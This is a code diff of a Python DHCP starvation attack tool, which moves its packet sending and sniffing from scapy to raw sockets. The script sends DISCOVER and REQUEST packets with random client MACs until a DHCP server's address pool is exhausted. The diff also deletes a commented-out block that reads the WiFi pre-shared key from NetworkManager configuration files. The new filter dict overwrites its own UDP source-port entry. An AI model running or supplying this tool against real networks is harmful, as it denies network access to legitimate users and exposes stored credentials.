@@ -7,18 +7,18 @@ project_root_path = dirname(dirname(dirname(abspath(__file__))))
 utils_path = project_root_path + "/Utils/"
 path.append(utils_path)
 
+from network import Ethernet_raw, DHCP_raw, Sniff_raw
+from tm import ThreadManager
+from base import Base
+
+from socket import socket, SOCK_RAW, AF_PACKET
 from sys import exit
 from os import system
-from base import Base
 from argparse import ArgumentParser
-from network import Ethernet_raw, DHCP_raw
 from datetime import datetime
 from time import sleep, time
 from random import randint
-from tm import ThreadManager
-from scapy.all import sniff, Ether, IP, BOOTP, DHCP, sendp
-from logging import getLogger, ERROR
-getLogger("scapy.runtime").setLevel(ERROR)
+from json import dumps
 # endregion
 
 # region Check user, platform and print banner
@@ -46,8 +46,7 @@ transactions = {}
 ack_received = False
 dhcp_server_ip = None
 dhcp_server_mac = None
-wifi_essid = None
-wifi_key = None
+global_socket = None
 # endregion
 
 # region set DHCP option code and value
@@ -77,30 +76,15 @@ if your_mac_address is None:
     exit(1)
 # endregion
 
+# region Create raw socket
+global_socket = socket(AF_PACKET, SOCK_RAW)
+global_socket.bind((listen_network_interface, 0))
+# endregion
+
 # region General output
 Base.print_info("Listen network interface: ", listen_network_interface)
 Base.print_info("Your IP address: ", your_ip_address)
 Base.print_info("Your MAC address: ", your_mac_address)
-
-# # region WiFi information
-# if Base.check_netiface_is_wireless(listen_network_interface):
-#     wifi_essid = Base.get_netiface_essid(listen_network_interface)
-#     if wifi_essid is not None:
-#         Base.print_info("WiFi ESSID: ", wifi_essid)
-#
-#         # region Get current wifi password
-#         wifi_config_path = "/etc/NetworkManager/system-connections/" + wifi_essid
-#         if path.exists(wifi_config_path):
-#             wifi_config = ConfigParser()
-#             wifi_config.readfp(open(wifi_config_path))
-#             wifi_key = wifi_config.get("wifi-security", "psk")
-#             if wifi_key is not None:
-#                 Base.print_info("WiFi Key: ", wifi_key[-3:].rjust(len(wifi_key), "*"))
-#         # endregion
-#
-#         Base.print_info("WiFi Frequency: ", str(Base.get_netiface_frequency(listen_network_interface)))
-# # endregion
-
 # endregion
 
 # region Get start time
@@ -119,60 +103,72 @@ def send_dhcp_discover():
     Base.print_info("Delay between DISCOVER packets: ", str(args.delay), " sec.")
     Base.print_info("Start sending packets: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
 
-    while True:
+    discover_raw_socket = socket(AF_PACKET, SOCK_RAW)
+    discover_raw_socket.bind((listen_network_interface, 0))
 
-        client_mac = eth.get_random_mac()
-        transaction_id = randint(1, 4294967295)
+    try:
+        while True:
 
-        discover_packet = dhcp.make_request_packet(source_mac=your_mac_address,
-                                                   client_mac=client_mac,
-                                                   transaction_id=transaction_id,
-                                                   dhcp_message_type=1,
-                                                   host_name=None,
-                                                   requested_ip=None,
-                                                   option_value=dhcp_option_value,
-                                                   option_code=dhcp_option_code,
-                                                   relay_agent_ip=your_ip_address)
-        sendp(discover_packet, iface=listen_network_interface, verbose=False)
-        transactions[transaction_id] = client_mac
+            client_mac = eth.get_random_mac()
+            transaction_id = randint(1, 4294967295)
 
-        if int(time() - start_time) > args.timeout:
-            if ack_received:
-                Base.print_success("IP address pool is exhausted: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
-            else:
-                Base.print_error("DHCP Starvation failed timeout!")
-            sleep(1)
-            exit(1)
+            discover_packet = dhcp.make_request_packet(source_mac=your_mac_address,
+                                                       client_mac=client_mac,
+                                                       transaction_id=transaction_id,
+                                                       dhcp_message_type=1,
+                                                       host_name=None,
+                                                       requested_ip=None,
+                                                       option_value=dhcp_option_value,
+                                                       option_code=dhcp_option_code,
+                                                       relay_agent_ip=your_ip_address)
+            discover_raw_socket.send(discover_packet)
+            transactions[transaction_id] = client_mac
 
-        sleep(int(args.delay))
+            if int(time() - start_time) > args.timeout:
+                if ack_received:
+                    Base.print_success("IP address pool is exhausted: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
+                else:
+                    Base.print_error("DHCP Starvation failed timeout!")
+                sleep(1)
+                exit(1)
+
+            sleep(int(args.delay))
+
+    except KeyboardInterrupt:
+        Base.print_info("Exit")
+        discover_raw_socket.close()
+        exit(0)
+
 # endregion
 
 
 # region Send DHCP request
 def send_dhcp_request(request):
+
     # region Global variables
     global start_time
     global ack_received
     global transactions
     global dhcp_server_ip
     global dhcp_server_mac
+    global global_socket
     # endregion
 
-    if request.haslayer(DHCP):
+    if 'DHCP' in request.keys():
 
         # region Get reply transaction id, client ip
-        xid = request[BOOTP].xid
-        yiaddr = request[BOOTP].yiaddr
-        siaddr = request[BOOTP].siaddr
+        xid = request['BOOTP']['transaction-id']
+        yiaddr = request['BOOTP']['your-ip-address']
+        siaddr = request['BOOTP']['server-ip-address']
         # endregion
 
         # region Get DHCP server IP
         if dhcp_server_ip is None:
             if siaddr == "0.0.0.0":
-                dhcp_server_ip = request[IP].src
+                dhcp_server_ip = request['IP']['source-ip']
             else:
                 dhcp_server_ip = siaddr
-            dhcp_server_mac = request[Ether].src
+            dhcp_server_mac = request['Ethernet']['source']
         # endregion
 
         # region Rewrite start time
@@ -180,12 +176,12 @@ def send_dhcp_request(request):
         # endregion
 
         # region DHCP OFFER
-        if request[DHCP].options[0][1] == 2:
+        if request['DHCP'][53] == 2:
             if args.find_dhcp:
                 Base.print_success("DHCP server IP: ", dhcp_server_ip)
                 Base.print_success("DHCP server MAC: ", dhcp_server_mac)
-                # Base.print_success("DHCP options: ")
-                # pprint(request[DHCP].options)
+                Base.print_success("DHCP packet: ")
+                print(dumps(request, indent=4))
                 exit(0)
 
             Base.print_info("OFFER from: ", dhcp_server_ip, " your client ip: ", yiaddr)
@@ -206,7 +202,7 @@ def send_dhcp_request(request):
                                                           option_value=dhcp_option_value,
                                                           option_code=dhcp_option_code,
                                                           relay_agent_ip=your_ip_address)
-                sendp(request_packet, iface=listen_network_interface, verbose=False)
+                global_socket.send(request_packet)
             except KeyError:
                 Base.print_error("Key error, this transaction id: ", hex(xid), " not found in our transactions!")
             except:
@@ -214,13 +210,13 @@ def send_dhcp_request(request):
         # endregion
 
         # region DHCP ACK
-        if request[DHCP].options[0][1] == 5:
+        if request['DHCP'][53] == 5:
             ack_received = True
             Base.print_info("ACK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
         # endregion
 
         # region DHCP NAK
-        if request[DHCP].options[0][1] == 6:
+        if request['DHCP'][53] == 6:
             Base.print_error("NAK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
         # endregion
 # endregion
@@ -303,10 +299,22 @@ if __name__ == "__main__":
         # endregion
 
         else:
+            # region Start DHCP sender in other thread
             tm = ThreadManager(2)
             tm.add_task(send_dhcp_discover)
-            sniff(filter="udp and src port 67 and dst port 67 and dst host " + your_ip_address,
-                  prn=send_dhcp_request, iface=listen_network_interface)
+            # endregion
+
+            # region Set network filter
+            network_filters = {}
+            network_filters['IP'] = {'destination-ip': your_ip_address}
+            network_filters['UDP'] = {'source-port': 67}
+            network_filters['UDP'] = {'destination-port': 67}
+            # endregion
+
+            # region Start sniffer
+            sniff = Sniff_raw()
+            sniff.start(protocols=['IP', 'UDP', 'DHCP'], prn=send_dhcp_request, filters=network_filters)
+            # endregion
 
     except KeyboardInterrupt:
         # region Start network
